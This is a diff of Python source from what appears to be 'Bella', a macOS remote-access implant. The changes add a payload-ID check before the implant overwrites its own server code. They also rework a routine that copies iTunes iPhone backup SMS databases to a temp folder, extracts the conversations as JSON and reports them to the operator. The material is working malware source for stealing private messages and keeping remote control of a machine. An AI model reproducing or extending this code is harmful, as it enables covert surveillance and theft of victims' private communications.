@@ -133,6 +133,9 @@ def subprocess_cleanup(): #will clean up all of those in the global payload_list
 			payload_list.remove(x)
 
 def host_update(updated_server):
+	if not "verify_update_id = '2f4e2e37c9b6eecebb0927a96938b4fa'" in updated_server:
+		send_msg('This does not appear to be a Bella payload. Cancelling update.', True)
+		return
 	with open(__file__, 'wb') as content:
 		content.write(updated_server)
 	send_msg('%sUpdated [%s] with new server code.\n' % (blue_star, __file__), False)
@@ -1031,10 +1034,15 @@ def iTunes_bk_sms_extract():
 	send_msg("%sFound the following SMS files:\n\t%s\n" % (blue_star, '\n\t'.join([x.split('/')[-2] for x in backup_paths])), False)
 	send_msg("%sProcessing...\n" % blue_star, False)
 	extracted = []
+	copy_path = tempfile.mkdtemp()
 	for backup in backup_paths:
+		with open(backup, 'r') as content:
+			dbcopy = content.read()
+		with open('%s/ifile' % copy_path, 'w') as content:
+			content.write(dbcopy)
 		json = ''
 		#start credits for below code https://github.com/fredrikhesse/iphone-sms-extract
-		with sqlite3.connect(backup) as conn:
+		with sqlite3.connect('%s/ifile' % copy_path) as conn:
 			json += "{\n\t\"conversations\":[\n"
 			chat_cursor = conn.cursor()
 			try:
@@ -1073,7 +1081,7 @@ def iTunes_bk_sms_extract():
 			json += "\t]\n}\n"
 		#end credits
 		extracted.append(('%s.json' % backup.split('/')[-2], json, backup.split('/')[2])) #backup UDID, json data, username
-	chat_db = globber("/Users/*/Library/Messages/chat.db")
+	shutil.rmtree(copy_path)
 	serial = [] #fast, custom bella serialization
 	for x in extracted:
 		send_msg("%sFound SMS data for %s [%s]\n" % (blue_star, x[2], byte_convert(len(json))), False)
